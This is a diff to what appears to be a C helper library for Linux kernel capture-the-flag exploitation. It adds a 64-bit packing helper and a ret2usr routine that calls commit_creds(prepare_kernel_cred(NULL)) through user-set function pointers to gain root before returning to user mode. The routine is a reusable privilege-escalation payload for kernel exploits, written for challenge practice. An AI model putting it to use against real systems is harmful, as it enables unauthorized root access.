@@ -164,6 +164,21 @@ void debug(){
     read(0,buf,0xf);
 }
 /*
+    Function Id 3:p64
+    Desc:
+        Return a heap pointer of little endian packed 64bit value
+    Example:
+        p64(0xdeadbeef);
+*/
+__u8 *p64(size_t val){
+    char *res  = malloc(0x18);
+    memset(res,0,0x18);
+    size_t * p = res;
+    * p = val;
+    return res;
+}
+
+/*
     Part II: MSGMSG related
 */
 
@@ -243,11 +258,32 @@ void msgQueueDel(int msgid){
 
 
 
+//  Part III: ret2usr
 
 
+/*
+    Function Id 2: getRootPrivilige
+    Desc:
+        getRootPrivilige for ret2usr.
+        Before hitting this chal, 
+        set commit_creds, prepare_kernel_cred, back2user
 
+    Example:
+        getRootPrivilige(msgid);
+*/
+size_t commit_creds = NULL;
+size_t prepare_kernel_cred = NULL;
+void (*back2user)()=NULL;
 
-
-
-
-
+void getRootPrivilige()
+{
+    if(prepare_kernel_cred==NULL || commit_creds == NULL)
+        panic("[-] prepare_kernel_cred or commit_creds is not set.");
+    
+    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
+    int (*commit_creds_ptr)(void *) = commit_creds;
+    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
+    if(back2user==NULL)
+        panic("[-] back2user is not set.");
+    back2user();
+}
